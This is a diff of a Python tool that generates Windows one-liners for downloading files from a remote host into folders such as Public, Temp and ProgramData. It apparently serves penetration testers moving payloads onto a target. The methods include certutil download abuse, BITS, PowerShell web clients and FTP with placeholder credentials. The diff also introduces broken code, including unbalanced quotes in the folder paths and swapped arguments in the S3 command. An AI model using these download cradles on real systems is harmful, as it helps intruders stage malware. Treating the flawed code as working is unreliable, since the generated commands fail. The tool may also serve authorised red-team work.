@@ -19,13 +19,19 @@ def downloadMethod(strMethod: str="certutil", strSource: str="", strDownloadFile
 	if "" in [strMethod, strSource, strDownloadFilepath]: return []
 	strMethod = strMethod.lower()
 	arrReturn = []
-	if strMethod in ['certutil', 'certutil.exe', '1', 'wlol', 'cmd', 'all']: arrReturn.append(f'certutil.exe -verifyctl -f -split "{strSource}" {strDownloadFilepath}')
-	if strMethod in ['invoke-webrequest', 'webrequest', '2', 'wlol', 'ps', 'all']: arrReturn.append(f'Invoke-WebRequest -Uri "{strSource}" -OutFile {strDownloadFilepath}')
-	if strMethod in ['webclient', 'system.net.webclient', '3', 'wlol', 'ps', 'all']: arrReturn.append(f'$webClient = New-Object System.Net.WebClient; $webClient.DownloadFile("{strSource}", {strDownloadFilepath})')
-	if strMethod in ['curl', 'curl.exe', '4', 'wlol', 'cmd', 'all']: arrReturn.append( f'curl -o {strDownloadFilepath} "{strSource}"')
-	if strMethod in ['bits', 'start-bitstransfer', '5', 'wlol', 'ps', 'all']: arrReturn.append(f'Start-BitsTransfer -Source  "{strSource}" -Destination {strDownloadFilepath}')
-	if strMethod in ['httpclient', 'system.net.http.httpclient', '6', 'wlol', 'ps', 'all']: arrReturn.append(f'$httpClient = New-Object System.Net.Http.HttpClient; $response = $httpClient.GetAsync("{strSource}").Result; $response.Content.ReadAsByteArrayAsync().Result | Set-Content -Path {strDownloadFilepath}-Encoding Byte')
-	if strMethod in ['dloader', 'dloader.exe', '7', 'cmd', 'all']: arrReturn.append(f'dloader.exe "{strSource}" {strDownloadFilepath}')
+	if strMethod in ['certutil', 'certutil.exe', 'wlol', 'cmd', 'all']: arrReturn.append(f'certutil.exe -verifyctl -f -split "{strSource}" "{strDownloadFilepath}"')
+	if strMethod in ['invoke-webrequest', 'webrequest', 'wlol', 'ps', 'all']: arrReturn.append(f'Invoke-WebRequest -Uri "{strSource}" -OutFile "{strDownloadFilepath}"')
+	if strMethod in ['webclient', 'system.net.webclient', 'wlol', 'ps', 'all']: arrReturn.append(f'$webClient = New-Object System.Net.WebClient; $webClient.DownloadFile("{strSource}", "{strDownloadFilepath}")')
+	if strMethod in ['curl', 'curl.exe', 'wlol', 'cmd', 'all']: arrReturn.append( f'curl -o "{strDownloadFilepath}" "{strSource}"')
+	if strMethod in ['bits', 'start-bitstransfer', 'wlol', 'ps', 'all']: arrReturn.append(f'Start-BitsTransfer -Source  "{strSource}" -Destination "{strDownloadFilepath}"')
+	if strMethod in ['httpclient', 'system.net.http.httpclient', 'wlol', 'ps', 'all']: arrReturn.append(f'$httpClient = New-Object System.Net.Http.HttpClient; $response = $httpClient.GetAsync("{strSource}").Result; $response.Content.ReadAsByteArrayAsync().Result | Set-Content -Path "{strDownloadFilepath}"-Encoding Byte')
+	if strMethod in ['restmethod', 'invoke-restmethod', 'wlol', 'ps', 'all']: arrReturn.append(f'Invoke-RestMethod -Uri "{strSource}" -OutFile "{strDownloadFilepath}"')
+	if strMethod in ['httpwebrequest', 'system.net.httpwebrequest', 'wlol', 'ps', 'all']: arrReturn.append(f'$request = [System.Net.HttpWebRequest]::Create("{strSource}"); $response = $request.GetResponse(); $stream = $response.GetResponseStream(); $reader = New-Object System.IO.StreamReader -ArgumentList $stream; Set-Content -Path "{strDownloadFilepath}" -Value $reader.ReadToEnd() -Encoding Byte; $reader.Close(); $stream.Close(); $response.Close()')
+	if strMethod in ['psftp', 'system.net.networkcredential', 'ftp', 'wlol', 'ps', 'all']: arrReturn.append(f'$webClient = New-Object System.Net.WebClient; $webClient.Credentials = New-Object System.Net.NetworkCredential(\'ftpUsernameOrAnonymousLol\', \'ftpPasswordOrRemoveThisValueWithThe,\'); $webClient.DownloadFile("{strSource}", "{strDownloadFilepath}")')
+	if strMethod in ['aws', 'system.net.networkcredential', 'ps', 'all']: arrReturn.append(f'Install-Module -Name AWSPowerShell -Scope CurrentUser; $bucketName = "replace-this-with-your-s3-bucket"; Import-Module AWSPowerShell; Read-S3Object -BucketName $bucketName -Key "{strDownloadFilepath}" -File "{strSource}"')
+	if strMethod in ['psbackground', 'receive-job', 'ps', 'all']: arrReturn.append(f'Receive-Job -Job Start-Job -ScriptBlock {{Invoke-WebRequest -Uri "{strSource}" -OutFile "{strDownloadFilepath}"}} -Wait')
+	if strMethod in ['psstrem', 'invoke-webrequest', 'ps', 'wlol', 'all']: arrReturn.append(f'$response = Invoke-WebRequest -Uri "{strSource}" -Method Get -PassThru;$stream = $response.RawContentStream; $fs = New-Object IO.FileStream "{strDownloadFilepath}", "Create";$buffer = New-Object byte[] 8192; while (($read = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {{$fs.Write($buffer, 0, $read)}}; $fs.Close(); $stream.Close()')
+	if strMethod in ['dloader', 'dloader.exe', 'cmd', 'all']: arrReturn.append(f'dloader.exe "{strSource}" "{strDownloadFilepath}"')
 	return arrReturn
 
 def pickDestinationFolder(strFolder: str="all", strFilename: str="") -> list:
@@ -34,15 +40,12 @@ def pickDestinationFolder(strFolder: str="all", strFilename: str="") -> list:
 	strFolder = strFolder.lower()
 	arrReturn = []
 	if strFolder in ['cmddocuments', 'documents', 'cmd', 'all']: arrReturn.append(f'C:\\Users\\%USERNAME%\\Documents\\{strFilename}')
-	if strFolder in ['psdocuments', 'documents', 'ps', 'all']: arrReturn.append(f'"C:\\Users\\$env:USERNAME\\Documents\\{strFilename}"')
-	if strFolder in ['cmddownloads', 'downloads', 'cmd', 'all']: arrReturn.append(f'C:\\Users\\%USERNAME%\\Downloads\\')
-	if strFolder in ['psdownloads', 'downloads', 'ps', 'all']: arrReturn.append(f'"C:\\Users\\$env:USERNAME\\Downloads\\{strFilename}"')
-	if strFolder in ['cmdpublic', 'public', 'cmd', 'all']: arrReturn.append(f'C:\\Users\\Public\\{strFilename}')
-	if strFolder in ['pspublic', 'public', 'ps', 'all']: arrReturn.append(f'"C:\\Users\\Public\\{strFilename}"')
-	if strFolder in ['cmdtemp', 'temp', 'cmd', 'all']: arrReturn.append(f'C:\\Temp\\{strFilename}')
-	if strFolder in ['pstemp', 'temp','ps', 'all']: arrReturn.append(f'"C:\\Temp\\{strFilename}"')
-	if strFolder in ['cmdprogramdata', 'programdata', ' cmd', 'all']: arrReturn.append(f'C:\\ProgramData\\{strFilename}')
-	if strFolder in ['psprogramdata', 'programdata', 'ps', 'all']: arrReturn.append(f'"C:\\ProgramData\\{strFilename}"')
+	if strFolder in ['psdocuments', 'documents', 'ps', 'all']: arrReturn.append(f'C:\\Users\\$env:USERNAME\\Documents\\{strFilename}"')
+	if strFolder in ['cmddownloads', 'downloads', 'cmd', 'all']: arrReturn.append(f'C:\\Users\\%USERNAME%\\Downloads\\"')
+	if strFolder in ['psdownloads', 'downloads', 'ps', 'all']: arrReturn.append(f'C:\\Users\\$env:USERNAME\\Downloads\\{strFilename}"')
+	if strFolder in ['public', 'all']: arrReturn.append(f'C:\\Users\\Public\\{strFilename}')
+	if strFolder in ['temp', 'all']: arrReturn.append(f'C:\\Temp\\{strFilename}')
+	if strFolder in ['programdata', 'all']: arrReturn.append(f'C:\\ProgramData\\{strFilename}')
 	if arrReturn == []: arrReturn.append(strFolder)
 	return arrReturn
 
@@ -65,7 +68,7 @@ def makeFilename(strSource: str, intLength: int=INTDEFAULTLENGTHOFFILENAME) -> s
 def fixDownloadLink(strSource: str, strFilename: str="") -> str:
 	if strSource == strFilename or strFilename == "": return strSource 
 	strReturn = strSource
-	if strSource[:7] != "http://" and strSource[:8] != "https://": strReturn = "http://"+ strSource
+	if strSource[:7] != "http://" and strSource[:8] != "https://" and strSource[:6] != "ftp://": strReturn = "http://"+ strSource
 	if strSource[-1] != "/": strReturn += "/"
 	strReturn += strFilename
 	return strReturn
@@ -144,7 +147,7 @@ if __name__ == "__main__":
 	showTutorial
 	parser.add_argument("method", help="Method used for downloading such as ex.: certutil, webrequest, webclient, curl, bits, httpclient, dloader, all, cmd, ps, wlol, and etc.")
 	parser.add_argument("url", help="If no file with filenames is used (-f key), then ex.: http://10.1.1.1/file.pdf\nIf file list is specified, then use: http://10.1.1.1/")
-	parser.add_argument("destination", help="Destination folder location, ex: psdocument, psdownloads, pspublic, pstemp, psprogramdata, document, cmddownloads, cmdpublic, cmdtemp, cmdprogramdata, or custom entry")
+	parser.add_argument("destination", help="Destination folder location, ex: psdocument, psdownloads, pspublic, cmddocument, cmddownloads, public, temp, programdata, or custom entry")
 	parser.add_argument("-f", "--file", type=str,
 						help="A file that contains multiple filenames (of files located in the same directory as the script) that need to be uploaded ")
 
@@ -153,3 +156,4 @@ if __name__ == "__main__":
 
 	arrOutputStrings = generateList(objArguments.method, objArguments.url, objArguments.destination, objArguments.file)
 	confirmWrite(arrOutputStrings)
+
